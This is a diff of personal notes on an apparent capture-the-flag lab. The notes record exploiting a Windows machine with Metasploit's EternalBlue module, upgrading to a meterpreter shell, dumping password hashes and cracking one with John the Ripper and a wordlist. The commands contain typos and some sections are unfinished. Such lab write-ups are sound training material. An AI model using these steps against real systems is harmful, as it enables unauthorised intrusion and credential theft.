@@ -60,7 +60,8 @@ search ms17
 
 search eternal - found that #2 matches : exploit /windows /smb/ms17_010_eternalblue 
 
-use 2 into command 
+use 2 
+
 
 ## question 3:
 Show options and set the one required value. What is the name of this value? (All caps for submission)
@@ -90,35 +91,94 @@ Question 1 :
 
 _If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)_
 
+post/multi/manage/shell_to_meterpreter
+
 
 ## Question 2:
 _Select this (use MODULEPATH). Show options, what option are we required to change?_
+
+session
 
 
 ## Question 3:
 _Set the required option, you may need to list all of the sessions to find your target here._ 
 
 
-**Question 4##**###
+## Question 4:
+_Run! If this doesn't work, try completing the exploit from the previous task once more._
 
 
 
+## Question 5:
+_Once the meterpreter shell conversion completes, select that session for use._
 
-Run! If this doesn't work, try completing the exploit from the previous task once more.
+## Question 6:
+
+Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
+
+getuid 
+
+## Question 7:
+
+post/multi/manage/shell_to_meterpreter
+
+run sessoion
+
 
 
 ## Task 4
+Q## uestions 1
+_Dump the non-default user's password and crack it!
+
+Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?_
+
+hashdump
+
+jon
 
 
+## Question 2
 
+_Copy this password hash to a file and research how to crack it. What is the cracked password?_
+
+**JOHN THE RIPPER**
+
+john jon.hash --fotmat =NT --wordlist=/opt/rockyou.txt 
+
+john jon.hash --format=NT --show
+
+alqfna22
 
 
 ## Task 5
 
+## Question 1
+_Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!_
 
 
+Had to get back to Meterpeter ( my session timed out) 
+
+## Flag 1- 
+_This flag can be found at the system root._
+pwd
+cd..
+cd..
+pwd 
 
 
+in the C:\windows 
+ls
+ls
+
+
+cd windoes 
+
+## flag 2
+*_Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen._
+
+
+## flag 3
+_flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved_. 
 
 
 
